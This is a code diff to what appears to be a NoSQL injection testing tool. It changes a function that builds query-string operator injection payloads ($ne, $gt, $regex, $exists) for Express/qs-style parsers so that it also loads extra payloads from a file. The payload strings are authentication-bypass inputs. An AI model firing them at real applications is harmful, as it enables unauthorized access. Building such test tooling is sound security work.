@@ -60,14 +60,26 @@ def auth_bypass_bodies(user_field: str, pass_field: str) -> list[dict]:
 
 
 def query_string_payloads(param: str) -> list[str]:
-    """Bracket-syntax operator injection for Express/qs-style parsers."""
-    return [
+    """Bracket-syntax operator injection for Express/qs-style parsers.
+
+    Built-ins are the guaranteed baseline; real-world payloads from
+    tools/payloads/nosqli_qs.txt are appended when present.
+    """
+    base = [
         f"{param}[$ne]=",
         f"{param}[$ne]=0",
         f"{param}[$gt]=",
         f"{param}[$regex]=.*",
         f"{param}[$exists]=true",
     ]
+    try:
+        from tools.payload_loader import load_lines
+        for p in load_lines("nosqli_qs", P=param):
+            if p not in base:
+                base.append(p)
+    except Exception:
+        pass
+    return base
 
 
 def where_sleep_body(user_field: str, pass_field: str, ms: int = 5000) -> dict:
